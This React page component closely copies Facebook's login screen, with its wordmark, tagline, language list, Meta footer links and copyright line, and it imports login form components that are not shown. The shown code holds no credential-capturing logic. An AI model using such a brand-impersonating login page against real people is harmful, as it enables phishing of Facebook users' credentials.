import React from 'react';
import LoginForm from '../../components/login/login-form';
import '../../app/globals.css';
import { isMobile } from 'react-device-detect';
import MobileLoginForm from '@/components/login/mobile-login-form';

function BrowserLogin() {
  return (
    <div className="flex flex-col min-h-screen">
      <div className="bg-[#f0f2f5] flex flex-col lg:flex-row justify-center items-center flex-grow">
        <div className="flex flex-col lg:flex-row justify-center items-center m-0 m-auto gap-20">
          <div className=" flex flex-col justify-center w-[41%]">
            <h1 className="text-[60px] font-bold text-blue-500">facebook</h1>
            <h2 className="text-[27px] font-normal">
              Facebook helps you connect and share with the people in your life.
            </h2>
          </div>
          <div className="flex justify-center items-center flex-col">
            <LoginForm />
          </div>
        </div>
      </div>
      <Footer />
    </div>
  );
}

function Footer() {
  const currentYear = new Date().getFullYear();
  return (
    <footer className="flex-shrink-0">
      <div className="container flex flex-col justify-center items-start mx-auto text-center w-[50%]">
        <ul className="footer-text flex flex-wrap gap-2 pb-3 pt-8 justify-center items-center">
          <li> English (UK)</li>
          <li className="cursor-pointer no-underline hover:underline">
            Tiếng Việt
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            中文(台灣)
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            한국어
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            日本語
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            Français (France)
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            ภาษาไทย
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            Español
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            Português (Brasil)
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            Deutsch
          </li>
          <li className="cursor-pointer no-underline hover:underline">
            Italiano
          </li>
          <li className="border border-slate-200 px-2 cursor-pointer bg-[#f0f2f5] text-sm font-medium">
            +
          </li>
        </ul>
        <hr className="border-1 w-full" />
        <ul className="footer-text flex flex-wrap pt-3 m-0 gap-3">
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Sign Up{' '}
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Log in
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Messenger
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Facebook Lite
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">Video</a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Places
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">Games</a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Marketplace
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Meta Pay
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Meta Store
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Meta Quest
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Instagram
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Threads
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Fundraisers
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Services
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Voting Information Centre
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Privacy Policy
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Privacy Centre
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Groups
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">About</a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Create ad
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Create Page
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Developers
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Careers
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Cookies
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              AdChoices
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">Terms</a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline"> Help</a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Contact uploading and non-users
            </a>
          </li>
          <li>
            <a className="cursor-pointer no-underline hover:underline">
              Settings
            </a>
          </li>
        </ul>
        <div className="footer-text mt-4 mb-8">
          <p className="text-[11px]">Meta © {currentYear}</p>
        </div>
      </div>
    </footer>
  );
}

export default function Login() {
  console.log("isMobile", isMobile)
  return isMobile ? <MobileLoginForm /> : <BrowserLogin />;
}
